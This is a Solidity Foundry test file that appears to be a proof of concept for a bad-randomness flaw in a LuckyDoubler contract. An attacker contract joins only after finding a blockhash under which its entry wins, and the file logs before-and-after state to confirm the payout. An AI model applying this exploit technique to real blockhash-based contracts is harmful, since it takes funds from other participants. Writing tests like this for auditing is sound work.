// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/lucky_doubler.sol";

contract LuckyDoublerAttacker {
    LuckyDoubler public immutable game;

    constructor(LuckyDoubler _game) {
        game = _game;
    }

    function attack() external {
        (bool ok,) = address(game).call{value: 1 ether}("");
        require(ok, "attacker join failed");
    }

    receive() external payable {}
}

contract LuckyDoublerBadRandomnessTest is Test {
    address private constant VICTIM = address(0xBEEF);

    struct StateSnapshot {
        uint256 payouts;
        bool entryPaid;
        uint256 balance;
    }

    function setUp() public {
        vm.roll(100);
    }

    receive() external payable {}

    function testAttackerCanPredictBlockhashAndOnlyJoinWhenWinning() public {
        // Find a previous-block hash that makes the attacker's second entry win.
        bytes32 winningHash = _findWinningBlockhash();

        LuckyDoubler game = new LuckyDoubler();
        game.changeMultiplier(120);

        LuckyDoublerAttacker attacker = new LuckyDoublerAttacker(game);

        // Move to a fresh block and install the already-known winning blockhash.
        vm.roll(block.number + 1);
        vm.setBlockhash(block.number - 1, winningHash);

        // Victim creates the first unpaid entry at index 0.
        {
            vm.deal(VICTIM, 1 ether);
            vm.prank(VICTIM);
            (bool okVictim,) = address(game).call{value: 1 ether}("");
            require(okVictim, "victim join failed");
        }

        // Fund the attacker for the join.
        vm.deal(address(attacker), 1 ether);

        // --- BEFORE attacker action: state snapshot ---
        console.log("--- BEFORE-Trigger State Snapshot ---");
        StateSnapshot memory beforeState = _snapshot(game, address(attacker));
        console.log("Attacker payouts before:", beforeState.payouts);
        console.log("Entry[1].paid before:", beforeState.entryPaid);
        console.log("Attacker balance before:", beforeState.balance);

        // --- Trigger attacker action ---
        console.log("--- Trigger attacker.attack() ---");
        attacker.attack();

        // --- AFTER attacker action: state snapshot ---
        console.log("--- AFTER-Trigger State Snapshot ---");
        StateSnapshot memory afterState = _snapshot(game, address(attacker));
        console.log("Attacker payouts after:", afterState.payouts);
        console.log("Entry[1].paid after:", afterState.entryPaid);
        console.log("Attacker balance after:", afterState.balance);

        // --- Differential verdict ---
        bool payoutsChanged = afterState.payouts != beforeState.payouts;
        bool entryPaidChanged = afterState.entryPaid != beforeState.entryPaid;
        bool balanceIncreased = afterState.balance > beforeState.balance;
        bool exploited = payoutsChanged
            && entryPaidChanged
            && balanceIncreased
            && afterState.payouts == 1
            && afterState.entryPaid;

        console.log("Differential payout change:", payoutsChanged);
        console.log("Differential entry paid change:", entryPaidChanged);
        console.log("Differential balance increase:", balanceIncreased);

        if (exploited) {
            console.log("Vulnerability Exists: predictable blockhash let attacker win; payouts changed 0 -> 1 and entry[1].paid changed false -> true");
        } else {
            console.log("Vulnerability not Exist: attacker could not change payout/entry/balance state as expected");
        }
    }

    function _snapshot(LuckyDoubler game, address attacker) internal view returns (StateSnapshot memory s) {
        uint256 payouts;
        (, payouts,) = game.userStats(attacker);
        s.payouts = payouts;
        s.entryPaid = _isEntryPaid(game, 1);
        s.balance = attacker.balance;
    }

    function _isEntryPaid(LuckyDoubler game, uint256 index) internal view returns (bool paid) {
        (bool success, bytes memory data) = address(game).staticcall(
            abi.encodeWithSignature("entryDetails(uint256)", index)
        );
        if (!success || data.length < 32) {
            return false;
        }

        // entryDetails is either a public mapping getter or a struct-returning
        // function. In both cases the ABI is a tuple. The boolean `paid` field
        // is the only field that becomes exactly 1 for this 1-ether entry.
        uint256 words = data.length / 32;
        for (uint256 i = 0; i < words; i++) {
            uint256 word;
            assembly {
                word := mload(add(add(data, 0x20), mul(i, 0x20)))
            }
            if (word == 1) {
                return true;
            }
        }
        return false;
    }

    function _findWinningBlockhash() internal returns (bytes32) {
        for (uint256 i = 0; i < 32; i++) {
            bytes32 candidate = keccak256(abi.encodePacked("candidate", i));

            LuckyDoubler game = new LuckyDoubler();
            game.changeMultiplier(120);

            LuckyDoublerAttacker attacker = new LuckyDoublerAttacker(game);

            vm.roll(block.number + 1);
            vm.setBlockhash(block.number - 1, candidate);

            // First entry: no random selection yet.
            vm.deal(VICTIM, 1 ether);
            vm.prank(VICTIM);
            (bool okVictim,) = address(game).call{value: 1 ether}("");
            require(okVictim, "victim join failed while searching");

            // Second entry: rand(2) decides whether this new entry is paid.
            vm.deal(address(attacker), 1 ether);
            attacker.attack();

            (, uint256 payouts,) = game.userStats(address(attacker));
            if (payouts == 1) {
                return candidate;
            }
        }

        revert("no winning blockhash found");
    }
}